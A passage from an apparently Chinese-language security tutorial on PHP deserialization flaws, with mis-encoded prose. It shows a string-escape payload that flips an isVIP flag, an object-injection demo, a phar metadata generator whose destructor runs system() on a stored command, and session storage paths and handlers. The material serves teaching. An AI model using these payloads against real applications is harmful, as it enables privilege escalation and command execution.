<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">110</span>:<span class="string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼šPHPååºåˆ—åŒ–çš„æœºåˆ¶æ˜¯ï¼Œæ¯”å¦‚å¦‚æœå‰é¢æ˜¯è§„å®šäº†æœ‰10ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯åªè¯»åˆ°äº†9ä¸ªå°±åˆ°äº†åŒå¼•å·ï¼Œè¿™ä¸ªæ—¶å€™PHPä¼šæŠŠåŒå¼•å·å½“åšç¬¬10ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸æ ¹æ®åŒå¼•å·åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦å·²ç»ç»“æŸï¼Œè€Œæ˜¯æ ¹æ®å‰é¢è§„å®šçš„æ•°é‡æ¥è¯»å–å­—ç¬¦ä¸²ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬éœ€è¦ä»”ç»†çœ‹ä¸€ä¸‹såé¢æ˜¯110ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦è¯»å–åˆ°110ä¸ªå­—ç¬¦ã€‚ä»ç¬¬ä¸€ä¸ªå¼•å·å¼€å§‹ï¼Œ110ä¸ªå­—ç¬¦å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´123456è¿™ä¸ªåœ°æ–¹æˆä¸ºäº†æˆ‘ä»¬çš„å¯æ§å˜é‡ï¼Œåœ¨123456å¯æ§å˜é‡çš„ä½ç½®ä¸­æ·»åŠ æˆ‘ä»¬çš„ç›®æ ‡å­ä¸²</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;s:5:&quot;</span>isVIP<span class="string">&quot;;i:1;&#125; //ç›®æ ‡å­ä¸²</span></span><br></pre></td></tr></table></figure>

<p>å®Œæ•´ä»£ç ä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é€‰ä¸­éƒ¨åˆ†ä¸€å…±æœ‰111ä¸ªå­—ç¬¦ï¼Œ</p>
<p>é€ æˆè¿™ç§ç°è±¡çš„åŸå› æ˜¯ï¼šæ›¿æ¢ä¹‹å‰æˆ‘ä»¬ç›®æ ‡å­ä¸²çš„ä½ç½®æ˜¯123456ï¼Œä¸€å…±6ä¸ªå­—ç¬¦ï¼Œæ›¿æ¢ä¹‹åæˆ‘ä»¬çš„ç›®æ ‡å­ä¸²æ˜¾ç„¶è¶…è¿‡10ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ä¼šé€ æˆè®¡ç®—å¾—åˆ°çš„payloadä¸å‡†ç¡®</p>
<p>è§£å†³åŠæ³•æ˜¯ï¼šå¤šæ·»åŠ 1ä¸ªadminï¼Œè¿™æ ·å°±å¯ä»¥è¡¥ä¸Šç¼ºå°‘çš„å­—ç¬¦ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ†æä¸€ä¸‹è¾“å‡ºç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">115</span>:<span class="string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">47</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">1</span>;&#125;<span class="string">&quot;;s:5:&quot;</span>isVIP<span class="string">&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="ä¸‰ã€å¯¹è±¡æ³¨å…¥"><a href="#ä¸‰ã€å¯¹è±¡æ³¨å…¥" class="headerlink" title="ä¸‰ã€å¯¹è±¡æ³¨å…¥"></a>ä¸‰ã€å¯¹è±¡æ³¨å…¥</h2><p>å½“ç”¨æˆ·çš„è¯·æ±‚åœ¨ä¼ ç»™ååºåˆ—åŒ–å‡½æ•°unserialize()ä¹‹å‰æ²¡æœ‰è¢«æ­£ç¡®çš„è¿‡æ»¤æ—¶å°±ä¼šäº§ç”Ÿæ¼æ´ã€‚å› ä¸ºPHPå…è®¸å¯¹è±¡åºåˆ—åŒ–ï¼Œæ”»å‡»è€…å°±å¯ä»¥æäº¤ç‰¹å®šçš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ç»™ä¸€ä¸ªå…·æœ‰è¯¥æ¼æ´çš„unserializeå‡½æ•°ï¼Œæœ€ç»ˆå¯¼è‡´ä¸€ä¸ªåœ¨è¯¥åº”ç”¨èŒƒå›´å†…çš„ä»»æ„PHPå¯¹è±¡æ³¨å…¥ã€‚å¯¹è±¡æ³¨å…¥ç±»ä¼¼äºä¸€ä¸ªåˆ©ç”¨ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•è¿›è¡Œå˜é‡è¦†ç›–çš„è¿‡ç¨‹ã€‚</p>
<p>å¯¹è±¡æ¼æ´å‡ºç°å¾—æ»¡è¶³ä¸¤ä¸ªå‰æ</p>
<p>1ã€unserializeçš„å‚æ•°å¯æ§ã€‚2ã€ ä»£ç é‡Œæœ‰å®šä¹‰ä¸€ä¸ªå«æœ‰é­”æœ¯æ–¹æ³•çš„ç±»ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•é‡Œå‡ºç°ä¸€äº›ä½¿ç”¨ç±»æˆå‘˜å˜é‡ä½œä¸ºå‚æ•°çš„å­˜åœ¨å®‰å…¨é—®é¢˜çš„å‡½æ•°ã€‚</p>
<p>ç»™å‡ºä¸€ä¸ªæ¡ˆä¾‹å¸®åŠ©ç†è§£</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;y4mao&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:5:&quot;maomi&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>åœ¨è„šæœ¬è¿è¡Œç»“æŸåä¾¿ä¼šè°ƒç”¨_destructå‡½æ•°ï¼ŒåŒæ—¶ä¼šè¦†ç›–testå˜é‡è¾“å‡ºmaomi</p>
<h2 id="å››ã€pharååºåˆ—åŒ–"><a href="#å››ã€pharååºåˆ—åŒ–" class="headerlink" title="å››ã€pharååºåˆ—åŒ–"></a>å››ã€pharååºåˆ—åŒ–</h2><p>pharï¼Œå…¨ç§°ä¸ºPHP Archiveï¼Œpharæ‰©å±•æä¾›äº†ä¸€ç§å°†æ•´ä¸ªPHPåº”ç”¨ç¨‹åºæ”¾å…¥.pharæ–‡ä»¶ä¸­çš„æ–¹æ³•ï¼Œä»¥æ–¹ä¾¿ç§»åŠ¨ã€</p>
<p>å®‰è£…ã€‚.pharæ–‡ä»¶çš„æœ€å¤§ç‰¹ç‚¹æ˜¯å°†å‡ ä¸ªæ–‡ä»¶ç»„åˆæˆä¸€ä¸ªæ–‡ä»¶çš„ä¾¿æ·æ–¹å¼ï¼Œ.pharæ–‡ä»¶æä¾›äº†ä¸€ç§å°†å®Œæ•´çš„PHPç¨‹</p>
<p>åºåˆ†å¸ƒåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å¹¶ä»è¯¥æ–‡ä»¶ä¸­è¿è¡Œçš„æ–¹æ³•ã€‚</p>
<h3 id="1ã€pharæ–‡ä»¶ç»“æ„"><a href="#1ã€pharæ–‡ä»¶ç»“æ„" class="headerlink" title="1ã€pharæ–‡ä»¶ç»“æ„"></a>1ã€pharæ–‡ä»¶ç»“æ„</h3><p>1ã€stub</p>
<p>ä¸€ä¸ªä¾›pharæ‰©å±•ç”¨äºè¯†åˆ«çš„æ ‡å¿—ï¼Œæ ¼å¼ä¸ºxxx<?php xxx; __HALT_COMPILER();?>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥</p>
<p>__HALT_COMPILER();?&gt;æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚</p>
<p>2ã€manifest</p>
<p>pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—</p>
<p>åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™é‡Œå³ä¸ºååºåˆ—åŒ–æ¼æ´ç‚¹ã€‚</p>
<p>3ã€contents</p>
<p>è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p>4ã€signature</p>
<p>ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾</p>
<h3 id="2ã€åˆ©ç”¨æ–¹æ³•"><a href="#2ã€åˆ©ç”¨æ–¹æ³•" class="headerlink" title="2ã€åˆ©ç”¨æ–¹æ³•"></a>2ã€åˆ©ç”¨æ–¹æ³•</h3><p>å¯åˆ©ç”¨åŸå› ï¼š</p>
<p>ä½¿ç”¨phar:&#x2F;&#x2F;ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶å¯¹meta-dataè¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p>
<p>åˆ©ç”¨æ–¹æ³•ï¼š</p>
<p>å°†è¦åºåˆ—åŒ–çš„å†…å®¹å†™å…¥meta-dataä¸­ï¼Œå†ä½¿ç”¨pharä¼ªåè®®è¿›è¡Œååºåˆ—åŒ–ã€‚é¦–å…ˆéœ€è¦ç”Ÿæˆpharæ–‡ä»¶ï¼Œ</p>
<p>åœ¨phpçš„é…ç½®æ–‡ä»¶ä¸­éœ€è¦è®¾ç½®phar.readonly&#x3D; Offã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="äº”ã€sessionååºåˆ—åŒ–"><a href="#äº”ã€sessionååºåˆ—åŒ–" class="headerlink" title="äº”ã€sessionååºåˆ—åŒ–"></a>äº”ã€sessionååºåˆ—åŒ–</h2><h3 id="1ã€åºåˆ—åŒ–å’Œååºåˆ—åŒ–sessionæœºåˆ¶"><a href="#1ã€åºåˆ—åŒ–å’Œååºåˆ—åŒ–sessionæœºåˆ¶" class="headerlink" title="1ã€åºåˆ—åŒ–å’Œååºåˆ—åŒ–sessionæœºåˆ¶"></a>1ã€åºåˆ—åŒ–å’Œååºåˆ—åŒ–sessionæœºåˆ¶</h3><p>åœ¨è®¡ç®—æœºä¸­ï¼Œå°¤å…¶æ˜¯åœ¨ç½‘ç»œåº”ç”¨ä¸­ï¼Œç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€ã€‚Session å¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚è¿™æ ·ï¼Œå½“ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºçš„ Web é¡µä¹‹é—´è·³è½¬æ—¶ï¼Œå­˜å‚¨åœ¨ Session å¯¹è±¡ä¸­çš„å˜é‡å°†ä¸ä¼šä¸¢å¤±ï¼Œè€Œæ˜¯åœ¨æ•´ä¸ªç”¨æˆ·ä¼šè¯ä¸­ä¸€ç›´å­˜åœ¨ä¸‹å»ã€‚å½“ç”¨æˆ·è¯·æ±‚æ¥è‡ªåº”ç”¨ç¨‹åºçš„ Web é¡µæ—¶ï¼Œå¦‚æœè¯¥ç”¨æˆ·è¿˜æ²¡æœ‰ä¼šè¯ï¼Œåˆ™ Web æœåŠ¡å™¨å°†è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª Session å¯¹è±¡ã€‚å½“ä¼šè¯è¿‡æœŸæˆ–è¢«æ”¾å¼ƒåï¼ŒæœåŠ¡å™¨å°†ç»ˆæ­¢è¯¥ä¼šè¯ã€‚</p>
<p>å½“ç¬¬ä¸€æ¬¡è®¿é—®ç½‘ç«™æ—¶ï¼ŒSeesion_start()å‡½æ•°å°±ä¼šåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„Session IDï¼Œå¹¶è‡ªåŠ¨é€šè¿‡HTTPçš„å“åº”å¤´ï¼Œå°†è¿™ä¸ªSession IDä¿å­˜åˆ°å®¢æˆ·ç«¯Cookieä¸­ã€‚åŒæ—¶ï¼Œä¹Ÿåœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªä»¥Session IDå‘½åçš„æ–‡ä»¶ï¼Œç”¨äºä¿å­˜è¿™ä¸ªç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚å½“åŒä¸€ä¸ªç”¨æˆ·å†æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™æ—¶ï¼Œä¹Ÿä¼šè‡ªåŠ¨é€šè¿‡HTTPçš„è¯·æ±‚å¤´å°†Cookieä¸­ä¿å­˜çš„Seesion IDå†æºå¸¦è¿‡æ¥ï¼Œè¿™æ—¶Session_start()å‡½æ•°å°±ä¸ä¼šå†å»åˆ†é…ä¸€ä¸ªæ–°çš„Session IDï¼Œè€Œæ˜¯åœ¨æœåŠ¡å™¨çš„ç¡¬ç›˜ä¸­å»å¯»æ‰¾å’Œè¿™ä¸ªSession IDåŒåçš„Sessionæ–‡ä»¶ï¼Œå°†è¿™ä¹‹å‰ä¸ºè¿™ä¸ªç”¨æˆ·ä¿å­˜çš„ä¼šè¯ä¿¡æ¯è¯»å‡ºï¼Œåœ¨å½“å‰è„šæœ¬ä¸­åº”ç”¨ï¼Œè¾¾åˆ°è·Ÿè¸ªè¿™ä¸ªç”¨æˆ·çš„ç›®çš„ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜éœ€è¦çŸ¥é“session_start()è¿™ä¸ªå‡½æ•°å·²ç»è¿™ä¸ªå‡½æ•°æ‰€èµ·çš„ä½œç”¨ï¼š</p>
<p>å½“ä¼šè¯è‡ªåŠ¨å¼€å§‹æˆ–è€…é€šè¿‡ session_start() æ‰‹åŠ¨å¼€å§‹çš„æ—¶å€™ï¼Œ PHP å†…éƒ¨ä¼šä¾æ®å®¢æˆ·ç«¯ä¼ æ¥çš„PHPSESSIDæ¥è·å–ç°æœ‰çš„å¯¹åº”çš„ä¼šè¯æ•°æ®ï¼ˆå³sessionæ–‡ä»¶ï¼‰ï¼Œ PHP ä¼šè‡ªåŠ¨ååºåˆ—åŒ–sessionæ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶å°†ä¹‹å¡«å……åˆ° $_SESSION è¶…çº§å…¨å±€å˜é‡ä¸­ã€‚å¦‚æœä¸å­˜åœ¨å¯¹åº”çš„ä¼šè¯æ•°æ®ï¼Œåˆ™åˆ›å»ºåä¸ºsess_PHPSESSID(å®¢æˆ·ç«¯ä¼ æ¥çš„)çš„æ–‡ä»¶ã€‚å¦‚æœå®¢æˆ·ç«¯æœªå‘é€PHPSESSIDï¼Œåˆ™åˆ›å»ºä¸€ä¸ªç”±32ä¸ªå­—æ¯ç»„æˆçš„PHPSESSIDï¼Œå¹¶è¿”å›set-cookieã€‚</p>
<p>session çš„å­˜å‚¨æœºåˆ¶phpä¸­çš„sessionä¸­çš„å†…å®¹ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨ï¼Œå­˜å‚¨æ–¹å¼ç”±é…ç½®é¡¹session.save_handleræ¥è¿›è¡Œç¡®å®šï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionidæ¥è¿›è¡Œå‘½åçš„ã€‚</p>
<p>å¸¸è§çš„sessionå­˜å‚¨è·¯å¾„ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php5/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php7/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSED</span><br></pre></td></tr></table></figure>

<p>php.iniä¸­ä¸€äº›sessioné…ç½®ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=<span class="string">&quot;&quot;</span> --è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„</span><br><span class="line">session.save_handler=<span class="string">&quot;&quot;</span>â€“è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)</span><br><span class="line">session.auto_start boolenâ€“æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯é»˜è®¤ä¸º<span class="number">0</span>ä¸å¯åŠ¨</span><br><span class="line">session.serialize_handler <span class="keyword">string</span>â€“å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–sessionçš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php</span><br></pre></td></tr></table></figure>

<h3 id="2ã€sessionååºåˆ—åŒ–ç®€å•åˆ©ç”¨"><a href="#2ã€sessionååºåˆ—åŒ–ç®€å•åˆ©ç”¨" class="headerlink" title="2ã€sessionååºåˆ—åŒ–ç®€å•åˆ©ç”¨"></a>2ã€sessionååºåˆ—åŒ–ç®€å•åˆ©ç”¨</h3><p>sessionååºåˆ—åŒ–çš„æ¼æ´æ˜¯ç”±ä¸‰ç§ä¸åŒçš„ååºåˆ—åŒ–å¼•æ“æ‰€äº§ç”Ÿçš„çš„æ¼æ´ï¼š</p>
<p>php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</p>
<p>php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼</p>
<p>php_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</p>
<p>ä¸‰ç§å¼•æ“çš„å­˜å‚¨æ ¼å¼ï¼š</p>
